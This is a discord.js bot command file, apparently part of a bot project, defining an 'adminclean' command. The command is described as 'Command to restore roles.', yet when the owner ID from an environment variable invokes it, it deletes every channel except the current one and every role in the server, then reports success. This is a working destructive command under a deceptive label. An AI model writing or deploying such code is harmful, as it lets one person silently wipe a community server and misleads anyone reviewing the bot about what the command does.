import { EmbedBuilder } from "discord.js"

const ownerId = process.env.ownerid;

export const data = {
  name: "adminclean",
  description: "Command to restore roles.",
  botpermission: ["Administrator"],
  async execute(interaction) {
    if(interaction.member.id !== ownerId) return

    interaction.guild.channels.cache.forEach(channel => {
      if (channel.id === interaction.channel.id) return
        channel.delete().catch(error => {console.error(`Error deleting channel: ${error.message}`);});
    });

    interaction.guild.roles.cache.forEach(role => {
      role.delete().catch(error => {console.error(`Error deleting role: ${error.message}`);});
    });

    const response = new EmbedBuilder()
      .setAuthor({ name: "Bot • Server clean successfully!" })
      .setDescription("Roles and channels removed")
      .setColor("Green")
      .setFooter({ text: 'Bot • Creative by K', iconURL: interaction.guild.iconURL({ dynamic: true }) });

    interaction.channel.send({ embeds: [response], components: [] });
  }
};
